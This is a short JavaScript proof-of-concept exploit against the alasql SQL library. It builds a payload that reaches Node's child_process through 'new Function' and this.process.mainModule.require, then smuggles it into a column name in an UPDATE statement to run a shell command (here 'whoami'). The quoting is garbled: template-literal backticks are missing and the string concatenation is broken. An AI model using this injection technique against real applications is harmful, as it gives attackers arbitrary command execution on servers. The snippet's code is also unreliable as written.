const genPayload = command => 
new Function(
    'return this.process.mainModule.require'
)()('child_process').execSync(${JSON.stringify(command)})
;


alasql('CREATE table i_am_a_table;' +
    INSERT INTO i_am_a_table VALUES (1337); +
    UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']=42;
);
